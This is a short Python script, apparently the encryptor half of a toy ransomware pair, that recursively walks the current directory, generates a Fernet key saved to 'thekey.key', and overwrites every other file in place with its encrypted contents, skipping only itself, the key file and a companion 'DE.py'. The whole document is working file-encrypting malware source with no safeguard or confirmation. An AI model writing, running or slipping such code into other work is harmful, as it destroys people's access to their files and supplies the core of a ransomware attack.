#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    with open(file_path, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file_path, "wb") as thefile:
        thefile.write(contents_encrypted)

files = []

for root, _, filenames in os.walk('.'):
    for filename in filenames:
        if filename in ["EN.py", "thekey.key", "DE.py"]:
            continue
        file_path = os.path.join(root, filename)
        files.append(file_path)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file_path in files:
    encrypt_file(file_path, key)
